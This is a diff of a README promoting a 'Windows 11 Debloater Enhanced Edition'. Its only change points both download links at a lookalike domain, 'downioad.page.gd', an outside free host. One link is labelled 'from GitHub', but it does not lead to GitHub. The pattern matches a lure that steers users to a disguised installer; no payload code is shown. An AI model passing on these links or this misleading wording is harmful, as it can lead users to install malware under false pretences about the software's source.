@@ -2,7 +2,7 @@
 
 Windows 11 Debloater Enhanced Edition is a comprehensive software solution tailored for users seeking to enhance their Windows 11 experience by removing unwanted bloatware and optimizing system settings. Developed in 2026, this tool offers a seamless way to customize your operating system, ensuring it runs smoothly and efficiently. Whether you are a tech enthusiast or a casual user, this debloater helps you reclaim control over your PC.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What Makes This Tool Stand Out?
 
@@ -70,6 +70,6 @@ Currently, the tool does not support scheduled tasks, but you can manually run i
 
 Ready to optimize your system? Download the latest version of Windows 11 Debloater Enhanced Edition directly from our GitHub page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 **Last Updated: December 2026**
